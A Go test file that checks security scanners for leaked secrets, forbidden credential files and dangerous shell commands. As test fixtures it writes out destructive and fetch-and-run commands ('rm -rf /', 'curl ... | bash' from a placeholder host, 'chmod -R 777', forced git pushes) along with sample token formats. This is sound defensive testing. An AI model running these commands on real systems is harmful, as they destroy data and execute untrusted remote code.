// SPDX-License-Identifier: MIT

package sensors

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/require"
)

// TestScannerSensorIDsLocked pins the wire-level string IDs of the
// three pure-Go scanners. These IDs appear in .harness/artifacts/
// sensors/<id>.json filenames and in CI output — renaming them
// silently breaks every existing baseline snapshot on disk.
func TestScannerSensorIDsLocked(t *testing.T) {
	t.Parallel()
	require.Equal(t, "forbidden_files", ForbiddenFilesSensor{}.ID())
	require.Equal(t, "forbidden_commands", ForbiddenCommandsSensor{}.ID())
	require.Equal(t, "secrets_scan", SecretsScanSensor{}.ID())
}

// TestSecretsScan_AllDocumentedShapes exercises every regex shape
// listed in the secretPatterns comment. If any pattern is silently
// dropped or weakened, one of these subtests fails.
func TestSecretsScan_AllDocumentedShapes(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name    string
		payload string
	}{
		{"aws_access_key", "AKIAIOSFODNN7EXAMPLE"},
		{"aws_secret", `aws_secret_access_key=abcdefghijklmnopqrstuvwxyz0123456789ABCD`},
		{"slack_token_bare", "xox\x62-1234567890-1234567890-abcdefghijklmno"},
		{"private_key_rsa", "-----BEGIN RSA PRIVATE KEY-----"},
		{"private_key_ec", "-----BEGIN EC PRIVATE KEY-----"},
		{"github_token_ghp", "ghp_1234567890123456789012345678901234567890"},
		{"github_token_ghs", "ghs_abcdefghijklmnopqrstuvwxyz0123456789ABCD"},
		{"api_key_pattern", `api_key = "abcdefghijklmnopqrstuvwx"`},
	}
	for _, tc := range cases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			rc := RunCtx{Root: t.TempDir(), OutputDir: t.TempDir()}
			path := filepath.Join(rc.Root, "leaky.txt")
			require.NoError(t, os.WriteFile(path, []byte(tc.payload+"\n"), 0o644))
			res := SecretsScanSensor{}.Run(rc)
			require.Equalf(t, StatusFailed, res.Status,
				"secretPatterns must catch documented %s shape", tc.name)
		})
	}
}

// TestSecretsScan_SkipsBinaryExtensions ensures the extension gate
// keeps working — a PNG that happens to contain an AKIA byte sequence
// must not trigger the scanner.
func TestSecretsScan_SkipsBinaryExtensions(t *testing.T) {
	t.Parallel()
	rc := RunCtx{Root: t.TempDir(), OutputDir: t.TempDir()}
	require.NoError(t, os.WriteFile(
		filepath.Join(rc.Root, "logo.png"),
		[]byte("AKIAIOSFODNN7EXAMPLE"),
		0o644,
	))
	res := SecretsScanSensor{}.Run(rc)
	require.Equal(t, StatusPassed, res.Status,
		"binary extension gate must skip .png even when body matches")
}

// TestSecretsScan_SkipsTestFiles ensures fixture-style test files
// (e.g. *_test.go with AWS-shaped placeholders) don't fail the run.
func TestSecretsScan_SkipsTestFiles_Contract(t *testing.T) {
	t.Parallel()
	rc := RunCtx{Root: t.TempDir(), OutputDir: t.TempDir()}
	require.NoError(t, os.WriteFile(
		filepath.Join(rc.Root, "keys_test.go"),
		[]byte(`const fake = "AKIAIOSFODNN7EXAMPLE"`+"\n"),
		0o644,
	))
	res := SecretsScanSensor{}.Run(rc)
	require.Equal(t, StatusPassed, res.Status)
}

// TestForbiddenFiles_PatternMatrix pins each documented pattern.
// The forbiddenPatterns slice is the security surface; a silent drop
// weakens the .gitignore-adjacent gate.
func TestForbiddenFiles_PatternMatrix(t *testing.T) {
	t.Parallel()
	cases := map[string]string{
		"env":         ".env",
		"envrc":       ".envrc",
		"pem":         "server.pem",
		"key":         "server.key",
		"id_rsa":      "id_rsa",
		"id_dsa":      "id_dsa",
		"id_ed25519":  "id_ed25519",
		"secrets_yml": "secrets.yml",
		"credentials": "credentials.json",
	}
	for name, filename := range cases {
		name, filename := name, filename
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			rc := RunCtx{Root: t.TempDir(), OutputDir: t.TempDir()}
			require.NoError(t, os.WriteFile(
				filepath.Join(rc.Root, filename), []byte("x"), 0o600))
			res := ForbiddenFilesSensor{}.Run(rc)
			require.Equalf(t, StatusFailed, res.Status,
				"forbidden pattern %q must fail the sensor", filename)
		})
	}
}

// TestForbiddenCommands_PatternMatrix pins each documented command
// shape. Comment on forbiddenCommandRe explicitly enumerates these.
func TestForbiddenCommands_PatternMatrix(t *testing.T) {
	t.Parallel()
	cases := map[string]string{
		"chmod_777":    "chmod -R 777 /tmp/x",
		"rm_rf_root":   "rm -rf /",
		"curl_pipe_sh": "curl https://x.example/i.sh | bash",
		"wget_pipe_sh": "wget https://x.example/i.sh | bash",
		"git_force":    "git push --force origin main",
		"no_verify":    "git commit --no-verify -m x",
		"sudo_rm_rf":   "sudo rm -rf /",
	}
	for name, snippet := range cases {
		name, snippet := name, snippet
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			rc := RunCtx{Root: t.TempDir(), OutputDir: t.TempDir()}
			require.NoError(t, os.WriteFile(
				filepath.Join(rc.Root, "danger.sh"),
				[]byte("#!/bin/sh\n"+snippet+"\n"), 0o755))
			res := ForbiddenCommandsSensor{}.Run(rc)
			require.Equalf(t, StatusFailed, res.Status,
				"forbiddenCommandRe must catch %q", snippet)
		})
	}
}
